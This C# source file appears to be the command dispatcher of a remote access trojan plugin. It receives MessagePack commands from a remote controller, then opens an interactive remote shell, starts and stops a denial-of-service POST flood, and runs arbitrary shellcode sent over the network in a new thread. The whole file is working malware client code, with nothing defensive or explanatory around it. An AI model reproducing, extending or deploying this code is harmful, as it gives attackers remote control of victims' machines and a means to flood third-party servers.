﻿using System;
using System.Threading;
using MessagePackLib.MessagePack;
using Miscellaneous.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static CancellationTokenSource ctsDos;

        public static byte[] bin { get; set; }

        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "shell":
                    {
                        HandleShell.StarShell();
                        break;
                    }

                    case "shellWriteInput":
                    {
                        if (HandleShell.ProcessShell != null)
                            HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                        break;
                    }

                    case "dosAdd":
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "dosAdd";
                        Connection.Send(msgpack.Encode2Bytes());
                        break;
                    }

                    case "dos":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "postStart":
                            {
                                ctsDos = new CancellationTokenSource();
                                new HandleDos().DosPost(unpack_msgpack);
                                break;
                            }

                            case "postStop":
                            {
                                ctsDos.Cancel();
                                Thread.Sleep(2500);
                                Connection.Disconnected();
                                break;
                            }
                        }

                        break;
                    }

                    case "Shellcode":
                    {
                        bin = unpack_msgpack.ForcePathObject("Bin").GetAsBytes();
                        ThreadStart threadStart = RunShellcode;
                        var thread = new Thread(threadStart);
                        thread.Start();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void RunShellcode()
        {
            Shellcode.Run(bin, true);
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}